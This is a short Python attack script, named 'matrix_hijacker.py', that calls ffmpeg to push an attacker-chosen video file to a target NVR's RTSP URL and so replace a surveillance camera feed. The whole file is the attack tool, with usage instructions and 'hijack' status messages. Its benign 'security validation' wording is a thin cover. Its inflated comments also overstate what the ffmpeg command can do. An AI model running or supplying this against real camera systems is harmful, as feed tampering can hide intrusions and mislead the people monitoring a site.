import sys
import subprocess
import os

def inject_custom_video(target_rtsp_url, custom_video_path):
    """Overwrite target NVR stream with custom security validation assets dynamically"""
    if not os.path.exists(custom_video_path):
        print(f"[-] Critical Error: Source payload file asset not found at {custom_video_path}")
        return None
        
    print(f"[*] Locking active transmission link on target endpoint: {target_rtsp_url}")
    
    # Advanced live real-time stream overwriting loop syntax configuration
    command = [
        'ffmpeg',
        '-re',                         # Read input file assets in real-time execution speed
        '-i', custom_video_path,       # Source validation payload configuration file path
        '-f', 'rtsp',                  # Enforce container format encapsulation structure to RTSP
        '-rtsp_transport', 'udp',      # Enforce UDP transportation layer protocol to maximize speed
        '-muxdelay', '0.1',
        target_rtsp_url                # Overwrite and occupy destination active endpoint URL parameter
    ]
    
    try:
        # Spawn asynchronous daemon process infrastructure to sustain deployment loop
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        print(f"[+] Dynamic stream hijack injection active for destination: {target_rtsp_url}")
        return process
    except Exception as e:
        print(f"[-] Subprocess operation failure on dynamic routing endpoint {target_rtsp_url}: {e}")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 matrix_hijacker.py <target_rtsp_url> <custom_video_path>")
        sys.exit(1)
        
    inject_custom_video(sys.argv[1], sys.argv[2])